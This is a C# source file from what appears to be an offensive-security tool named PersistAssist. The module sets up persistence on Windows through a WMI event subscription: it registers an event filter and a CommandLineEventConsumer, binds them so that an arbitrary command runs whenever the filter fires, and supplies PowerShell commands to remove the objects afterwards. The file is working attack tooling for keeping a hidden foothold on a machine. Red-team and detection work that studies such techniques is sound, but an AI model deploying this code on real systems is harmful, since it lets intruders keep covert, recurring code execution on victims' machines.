using PersistAssist.Models;

using static PersistAssist.Utils.WMIOps;
using static PersistAssist.Utils.Extensions;

namespace PersistAssist.Functions
{
    public class CommandLine : Persist
    {
        public override string PersistName => "CommandLine";

        public override string PersistDesc => "Create an CommandLineEventConsumer based WMI subscription";

        public override string PersistUsage =>
            "Persist: PersistAssist.exe -t CommandLine -p -efq [eventFilter query] -efn [eventFilter name] -ecn [eventConsumer name] -ecv [eventConsumer path]\n" +
            "Cleanup: PersistAssist.exe -t CommandLine -c -efn [eventFilter name] -ecn [eventConsumer Name]";

        public override Data.Enums.PersistType PersistCategory => Data.Enums.PersistType.WMI;

        public override bool requiresAdmin => true;

        public override string PersistExec(ParsedArgs pArgs) {
            if (pArgs.eventFilterQuery.isEmpty() || pArgs.eventFilterName.isEmpty() || pArgs.eventConsumerName.isEmpty() || pArgs.eventConsumerValue.isEmpty()) {
                throw new PersistAssistException("Incorrect parameters passed. See technique usage");
            }

            var eventFilter = registerEventFilter(pArgs.eventFilterQuery, pArgs.eventFilterName);
            var eventConsumer = registerCommandLineEventConsumer(pArgs.eventConsumerName, pArgs.eventConsumerValue);
            var FTCB = registerFilterToConsumerBinding(eventFilter.Path.RelativePath, eventConsumer.Path.RelativePath);

            return $"[*] Successfully established WMI persistence via CommandLineEventConsumer\n" +
                $"EventFilter: {eventFilter}\n" +
                $"EventConsumer: {eventConsumer}\n" +
                $"FilterToConsumerBinding: {FTCB}";
        }

        public override string PersistCleanup(ParsedArgs pArgs)
        {
            if (pArgs.eventFilterName.isEmpty() || pArgs.eventConsumerName.isEmpty()) {
                throw new PersistAssistException("Incorrect parameters passed. See technique usage");
            }
            return $"Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='{pArgs.eventFilterName}'\" | Remove-WmiObject\n" +
                $"Get-WMIObject -Namespace root\\Subscription -Class CommandLineEventConsumer -Filter \"Name='{pArgs.eventConsumerName}'\" | Remove-WmiObject\n" +
                $"Get-WMIObject -Namespace root\\subscription -Class __FilterToConsumerBinding | where Filter -like \"*{pArgs.eventFilterName}*\" | Remove-WmiObject";

        }
    }
}
